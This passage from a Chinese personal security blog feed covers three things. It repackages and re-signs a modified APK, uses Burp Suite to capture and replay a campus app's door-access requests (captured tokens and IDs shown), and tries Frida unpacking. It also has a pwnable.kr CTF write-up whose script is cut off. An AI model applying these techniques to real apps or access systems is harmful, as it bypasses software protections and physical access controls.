alt="image-20220519215659924"></p><h3 id="重新打包apk"><a href="#重新打包apk" class="headerlink" title="重新打包apk"></a>重新打包apk</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\apktool_2.6.1.jar b .\base(2)(1)\</span><br></pre></td></tr></table></figure><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519215742175.png" alt="image-20220519215742175"></p><p>回编译成功。回编译成功后的文件会保存在apktool解包后的项目的dist目录下：</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519215850317.png" alt="image-20220519215850317"></p><h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><p>仅仅修改到上方这种程度是不能被我们的手机所安装的，这是因为apktool对我们的程序进行打包的时候，不会对打包好的apk文件进行签名，而我们的手机一般情况下应该是不能安装未经签名的程序的，所以我们进行到最后一步——对破解的apk签名，这里我是用的AS创建的jks签名文件：</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519220156079.png" alt="image-20220519220156079"></p><p>生成好key之后记住password还有alias，下面要用到。</p><p>然后将SDK下的进行签名操作的文件拿到，如下位置：</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519220343157.png" alt="image-20220519220343157"></p><p>挪到待签名apk文件的目录下，执行下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apksigner.jar sign  --ks &#x27;.\Android Signiture\test-1.jks&#x27;  --ks-key-alias key0 --ks-pass pass:henu.123456 --out biquge.apk  &#x27;.\base(2)(1).apk&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java -jar apksigner.jar sign           //执行签名操作</span><br><span class="line">--ks 你的jks路径                                 //jks签名证书路径</span><br><span class="line">--ks-key-alias 你的alias           //生成jks时指定的alias</span><br><span class="line">--ks-pass pass:你的密码          //KeyStore密码</span><br><span class="line">--key-pass pass:你的密码   //签署者的密码，即生成jks时指定alias对应的密码</span><br><span class="line">--out output.apk                         //输出路径</span><br><span class="line">input.apk                                     //被签名的apk</span><br></pre></td></tr></table></figure><p><strong>最后安装到我们的手机即可，成功，赢！</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite抓安卓包</title>
      <link href="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85/"/>
      <url>/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天有个需求需要用burp抓安卓应用的包，下面记录一下学习过程，以及我是怎么用burp来抓安卓的包的。</p><h3 id="配置mumu模拟器"><a href="#配置mumu模拟器" class="headerlink" title="配置mumu模拟器"></a>配置mumu模拟器</h3><p>用雷电模拟器出现了问题，故而换做使用夜神模拟器。首先打开设置，配置一下wifi，<strong>左键长按 -&gt; 修改网络</strong>即可。改成我们的pc机的IP地址，就行了。</p><p><img src="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85//image-20220518183527877.png" alt="image-20220518183527877"></p><p>这时打开一个使用网络的应用程序，就能在burp上抓到包了。</p><p><strong>但是，不知道为什么，这个nox模拟器不能打开我想要抓包的那个软件，所以我又把模拟器换成了mumu模拟器。但，即使不是一个模拟器，他们的手动代理的配置方式是相同的。</strong></p><p><img src="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85//image-20220518214102171.png" alt="image-20220518214102171"></p><p>抓包成功。</p><h3 id="实例一、完美校园抓包"><a href="#实例一、完美校园抓包" class="headerlink" title="实例一、完美校园抓包"></a>实例一、完美校园抓包</h3><p>完美校园有一个功能，早就想给他dump出来了，但是由于各种原因，一直都没能亲手实现，这次补票了。这个功能为什么我想把它dump出来呢？因为最近我的NFC卡不能用了，打击很大，那我又总是忘记拿校园卡，想使用方便的打开门的方式，只好动手搞一下这个东西了。</p><h4 id="示例抓包"><a href="#示例抓包" class="headerlink" title="示例抓包"></a>示例抓包</h4><p><strong>21号楼</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=&amp;method=AccessCheckGrantInfoWuline&amp;accessToken=f98d7dbea14b7f0bd332e61222c9cd4d&amp;customerCode=817&amp;param=&#123;&quot;postCode&quot;:&quot;null&quot;,&quot;name&quot;:&quot;21号楼&quot;,&quot;dpcode&quot;:&quot;00000000&quot;,&quot;customerid&quot;:&quot;9336568&quot;,&quot;termid&quot;:&quot;10202&quot;,&quot;lockcode&quot;:&quot;null&quot;,&quot;termtype&quot;:&quot;2&quot;,&quot;systemid&quot;:&quot;48&quot;,&quot;iotype&quot;:&quot;0&quot;,&quot;extendposcode&quot;:&quot;2896515266&quot;,&quot;extendtermid&quot;:&quot;1&quot;,&quot;location&quot;:null&#125;</span><br></pre></td></tr></table></figure><p><strong>小东门 入-左4</strong>抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=&amp;method=AccessCheckGrantInfoWuline&amp;accessToken=99e90274823f2274d8f4a3c4ae25cbe3&amp;customerCode=817&amp;param=&#123;&quot;postCode&quot;:&quot;null&quot;,&quot;name&quot;:&quot;小东门&quot;,&quot;dpcode&quot;:&quot;00000000&quot;,&quot;customerid&quot;:&quot;9336568&quot;,&quot;termid&quot;:&quot;10337&quot;,&quot;lockcode&quot;:&quot;null&quot;,&quot;termtype&quot;:&quot;2&quot;,&quot;systemid&quot;:&quot;48&quot;,&quot;iotype&quot;:&quot;0&quot;,&quot;extendposcode&quot;:&quot;2757835782&quot;,&quot;extendtermid&quot;:&quot;1&quot;,&quot;location&quot;:null&#125;</span><br></pre></td></tr></table></figure><h4 id="对比观察"><a href="#对比观察" class="headerlink" title="对比观察"></a>对比观察</h4><p><strong>小东门 入-左2</strong>抓包 <code>3-1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=&amp;method=AccessCheckGrantInfoWuline&amp;accessToken=99e90274823f2274d8f4a3c4ae25cbe3&amp;customerCode=817&amp;param=&#123;&quot;postCode&quot;:&quot;null&quot;,&quot;name&quot;:&quot;小东门&quot;,&quot;dpcode&quot;:&quot;00000000&quot;,&quot;customerid&quot;:&quot;9336568&quot;,&quot;termid&quot;:&quot;10339&quot;,&quot;lockcode&quot;:&quot;null&quot;,&quot;termtype&quot;:&quot;2&quot;,&quot;systemid&quot;:&quot;48&quot;,&quot;iotype&quot;:&quot;0&quot;,&quot;extendposcode&quot;:&quot;3563586319&quot;,&quot;extendtermid&quot;:&quot;1&quot;,&quot;location&quot;:null&#125;</span><br></pre></td></tr></table></figure><p><strong>小东门 出-左3</strong>抓包 <code>3-2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=&amp;method=AccessCheckGrantInfoWuline&amp;accessToken=50e2e77324e6ce1339d59731a9194075&amp;customerCode=817&amp;param=&#123;&quot;postCode&quot;:&quot;null&quot;,&quot;name&quot;:&quot;小东门&quot;,&quot;dpcode&quot;:&quot;00000000&quot;,&quot;customerid&quot;:&quot;9336568&quot;,&quot;termid&quot;:&quot;10339&quot;,&quot;lockcode&quot;:&quot;null&quot;,&quot;termtype&quot;:&quot;2&quot;,&quot;systemid&quot;:&quot;48&quot;,&quot;iotype&quot;:&quot;0&quot;,&quot;extendposcode&quot;:&quot;3563586319&quot;,&quot;extendtermid&quot;:&quot;2&quot;,&quot;location&quot;:null&#125;</span><br></pre></td></tr></table></figure><p>上面这两个包其实是一个通道机的进出，两个方向的请求报文内容。很容易观察到，他们相差的仅仅是<code>&quot;extendtermid&quot;:&quot;1&quot;</code>与<code>&quot;extendtermid&quot;:&quot;2&quot;</code>，其中<code>1</code>代表进门、<code>2</code>代表出门，其他的数据都是相同的，accessToken经过测试发现不影响我们的使用。</p><h4 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h4><p>构造请求包，方便我们进一步进行封装，下面为测试成功截图：</p><p><img src="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85//image-20220518220451573.png" alt="image-20220518220451573"></p><p>下一步我们需要将这里的请求内容，给他封装到一个应用程序里面。</p><h4 id="写Application"><a href="#写Application" class="headerlink" title="写Application"></a>写Application</h4><p>写到一半发现，这个accessToken才是主角，只能维持1个小时，超过一个小时会判定为过期了。焯，获得accessToken的算法又无从获得，所以我想这个软件的开发得暂时告一段落了。</p><p>虽然开发不会继续下去了，但是通过上面得内容，我依然也学到了不少的东西，最重要的就是学会了怎么抓安卓应用的包(虽然这个操作挺简单的)，还有，重温了一下请求包的流量分析。挺好的！</p><p>接下来，如果要继续下去的话，就要逆向一下完美校园这个软件了，但是这个软件使用了，360的qihoo加固，暂时又是知识盲区，接下来如果学会了相关方面的知识的话，也许可以继续下去，暂告终结。</p><h3 id="frida配置"><a href="#frida配置" class="headerlink" title="frida配置"></a>frida配置</h3><h4 id="安装frida"><a href="#安装frida" class="headerlink" title="安装frida"></a>安装frida</h4><p><code>python 3、windows 10</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><h4 id="查看手机cpu架构"><a href="#查看手机cpu架构" class="headerlink" title="查看手机cpu架构"></a>查看手机cpu架构</h4><p>查看手机cpu的架构。首先打开手机模拟器，然后找到adb所在的文件夹，执行下面的命令查看手机cpu架构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure><p>若发生意外，可以考虑执行<code>adb connect</code></p><p><img src="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85//image-20220519084908770.png" alt="image-20220519084908770"></p><h4 id="下载对应的server文件"><a href="#下载对应的server文件" class="headerlink" title="下载对应的server文件"></a>下载对应的server文件</h4><p><a href="https://github.com/frida/frida/releases">下载地址</a></p><p><img src="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85//image-20220519085009692.png" alt="image-20220519085009692"></p><p>下载上一步CPU架构对应的文件即可。</p><h4 id="将server文件传到手机并运行"><a href="#将server文件传到手机并运行" class="headerlink" title="将server文件传到手机并运行"></a>将server文件传到手机并运行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\adb_server.exe push frida-server-15.1.22-android-x86_64 /data/local/tmp/</span><br><span class="line">.\adb_server.exe shell</span><br><span class="line">chmod 755 /data/local/tmp/frida-server-15.1.22-android-x86_64</span><br><span class="line">cd /data/local/tmp/</span><br><span class="line">./frida-server-15.1.22-android-x86_64 &amp;</span><br></pre></td></tr></table></figure><p>然后载主机上使用<code>frida-ps -U</code>查看是否连接成功即可。</p><p><img src="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85//image-20220519085400787.png" alt="image-20220519085400787"></p><h3 id="frida脱壳"><a href="#frida脱壳" class="headerlink" title="frida脱壳"></a>frida脱壳</h3><h4 id="下载脱壳脚本"><a href="#下载脱壳脚本" class="headerlink" title="下载脱壳脚本"></a>下载脱壳脚本</h4><p><a href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida-dexdump</span><br></pre></td></tr></table></figure><h4 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-dexdump -FU</span><br></pre></td></tr></table></figure><p>失败，应用程序开启了反调试，或者是说，应用程序加了一个不能被调试的功能，鉴定为G。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、七、input</title>
      <link href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input/"/>
      <url>/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input/</url>
      
        <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="type">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="type">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>简单分析一下哈，发现这个题目跟密码学的题目有些类似，就是分了几个关卡。我们需要一关一关地过去，下面分析一下这几部分。</p><h4 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个题目就是要求必须有100个参数传入，我看别人地分享，有下面地内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">argv[‘A’] = argv[65] = “\x00”</span><br><span class="line">argv[‘B’] = argv[66] = “\x20\x0a\x0d”</span><br></pre></td></tr></table></figure><p>因为argv其实是一个数组，那里面地<code>&#39;A&#39;、&#39;B&#39;</code>这两个，自然要转化为相对应地ASCII的值。即<code>A=&gt;65、B=&gt;66、C=&gt;67</code>。</p><h4 id="stdio"><a href="#stdio" class="headerlink" title="stdio"></a>stdio</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个就不难看出来了，<code>0=&gt;stdin、1=&gt;stdout、2=&gt;stderr</code>，但是实际测试的时候出错了，这里传参需要用下面的方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r1, w1 = os.pipe()</span><br><span class="line">r2, w2 = os.pipe()</span><br><span class="line">os.write(w1, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">os.write(w2, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="env"><a href="#env" class="headerlink" title="env"></a>env</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>环境变量：是一个键值对。</p><p>这里的需求就是变量<code>\xde\xad\xbe\xef</code>对应的值应为<code>\xca\xfe\xba\xbe</code>。</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>这个主要就是这个fread这个函数第一次见，他的使用方式如下：</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input//image-20220517131108232.png" alt="image-20220517131108232"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>那这里的意思就是从文件<code>\x0a</code>中读取4个1字节的内容，如果其值为<code>\x00\x00\x00\x00</code>的话，则过关。</p><h4 id="network"><a href="#network" class="headerlink" title="network"></a>network</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br></pre></td></tr></table></figure><p>绑定的port的数值需要由我们指定，也就是<code>argv[67]</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里直接使用socket的send即可。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>脉络基本上清晰了。这题的大概意思估计就是让我们知道，二进制中各种参数传递的方式了，我们需要利用pwntools工具进行解题。这题应该类似web中的get、post传参这种吧，没什么漏洞点应该，考察的是基础知识点。考察的内容跟题目的名称也对照上去了，哈哈，下面写出脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span 